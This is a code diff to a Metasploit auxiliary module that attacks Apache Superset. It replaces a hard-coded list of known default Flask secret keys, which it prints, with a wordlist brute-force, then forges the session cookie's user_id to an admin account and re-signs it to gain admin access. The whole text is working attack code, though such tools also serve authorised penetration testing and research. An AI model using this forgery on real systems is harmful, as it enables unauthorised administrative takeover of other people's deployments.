@@ -47,7 +47,11 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
         OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
         OptInt.new('ADMIN_ID', [true, 'The ID of an admin account', 1]),
-        OptString.new('TARGETURI', [ true, 'Relative URI of Apache Superset installation', '/'])
+        OptString.new('TARGETURI', [ true, 'Relative URI of Apache Superset installation', '/']),
+        OptPath.new('SECRET_KEYS_FILE', [
+          false, 'File containing secret keys to try, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'superset_secret_keys.txt')
+        ]),
       ]
     )
   end
@@ -71,32 +75,41 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def valid_cookie(decoded_cookie)
-    [
-      "\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h", # version < 1.4.1
-      'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
-      'thisISaSECRET_1234',                            # deployment template
-      'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
-      'TEST_NON_DEV_SECRET'                            # docker compose
-    ].each do |secret|
-      print_status("Attempting to resign with key: #{secret}")
-      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(decoded_cookie, secret)
-      print_status("#{peer} - New signed cookie: #{encoded_cookie}")
-      cookie_jar.clear
-      res = send_request_cgi(
-        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'me', '/'),
-        'cookie' => "session=#{encoded_cookie};",
-        'keep_cookies' => true
-      )
-      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-      if res.code == 401
-        print_bad("#{peer} - Cookie not accepted")
+  def get_secret_key(cookie)
+    File.open(datastore['SECRET_KEYS_FILE'], 'rb').each do |secret|
+      secret = secret.strip
+      vprint_status("#{peer} - Checking secret key: #{secret}")
+
+      unless Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, secret)
+        vprint_bad("#{peer} - Incorrect Secret Key: #{secret}")
         next
       end
-      data = res.get_json_document
-      print_good("#{peer} - Cookie validated to user: #{data['result']['username']}")
-      return encoded_cookie
+
+      print_good("#{peer} - Found secret key: #{secret}")
+      return secret
     end
+    nil
+  end
+
+  def validate_cookie(decoded_cookie, secret_key)
+    print_status("#{peer} - Attempting to resign with key: #{secret_key}")
+    encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(decoded_cookie, secret_key)
+
+    print_status("#{peer} - New signed cookie: #{encoded_cookie}")
+    cookie_jar.clear
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'me', '/'),
+      'cookie' => "session=#{encoded_cookie};",
+      'keep_cookies' => true
+    )
+    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
+    if res.code == 401
+      print_bad("#{peer} - Cookie not accepted")
+      return nil
+    end
+    data = res.get_json_document
+    print_good("#{peer} - Cookie validated to user: #{data['result']['username']}")
+    return encoded_cookie
   end
 
   def run
@@ -131,10 +144,17 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::NoAccess, "#{peer} - Failed login") if res.body.include? 'Sign In'
     cookie = res.get_cookies.to_s
     print_good("#{peer} - Logged in Cookie: #{cookie}")
-    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
+
+    # get the cookie value and strip off anything else
+    cookie = cookie.split('=')[1].gsub(';', '')
+
+    secret_key = get_secret_key(cookie)
+    fail_with(Failure::NotFound, 'Unable to find secret key') if secret_key.nil?
+
+    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie)
     decoded_cookie['user_id'] = datastore['ADMIN_ID']
     print_status("#{peer} - Modified cookie: #{decoded_cookie}")
-    admin_cookie = valid_cookie(decoded_cookie)
+    admin_cookie = validate_cookie(decoded_cookie, secret_key)
 
     fail_with(Failure::NoAccess, "#{peer} - Unable to sign cookie with a valid secret") if admin_cookie.nil?
     (1..101).each do |i|
